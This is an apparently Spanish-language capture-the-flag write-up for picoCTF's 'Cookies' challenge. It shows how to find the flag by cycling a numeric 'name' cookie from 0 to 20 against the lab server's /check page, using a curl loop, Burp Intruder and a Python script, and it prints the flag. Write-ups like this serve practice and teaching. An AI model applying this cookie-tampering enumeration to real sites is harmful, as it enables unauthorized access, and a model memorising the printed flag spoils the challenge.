
# Cookies
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)

## Solución
http://mercury.picoctf.net:6418/

- Aparece un cuadro de búsqueda, parece un buscador de galletas, se sugiere un cookie: `snickerdoodle`

```
### Cookies
### Welcome to my cookie search page. See how much I like different kinds of cookies!

snickerdoodle

Search

© PicoCTF
```
- Examinemos las cookies con cokieditor, hay una cookie establecida, con un valor de -1
```
name = -1
```

. Que pasa si usamos el valor de busqueda sugerido? Cambia la cookie ? :  `snickerdoodle`
```
That is a cookie! Not very special though...

**I love snickerdoodle cookies!**
```
- La cookie cambia:
```
name = 0
```

### Consola
- Rotar las cookies con un ciclo for y un curl
. Solo hay que ver a donde va dirigida la petición 
```
http://mercury.picoctf.net:6418/check
```
- Lanzar un ejemplo antes del ciclo
```bash
		for i in {0..20} ; do curl -s http://mercury.picoctf.net:6418/check -H "Cookie: name=$i" ; done | grep pico

    <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>
```

## Burp
- Mandar al repeateer, modificarlo y ver resultados
- Usar intruder > 
	- Attack Type > sniber
	- Payload type Numbers
		- 1 a 20 de 1 en 1
	- Inciar ataque
	- Buscar cadena en las respuetas abajo
- Repetir itruder
	- Todo lo anteriot + Grep Match > picoCTF

## Python
```python
import requests
import re

url = 'http://mercury.picoctf.net:6418/check'

for i in range(21):
	cookies = {'name':'{}'.format(i)}
	r = requests.get(url, cookies=cookies)
	if 'picoCTF{' in r.text:
		flag = re.findall('picoCTF\{.*?\}', r.text)[0]
		print(flag)  
```
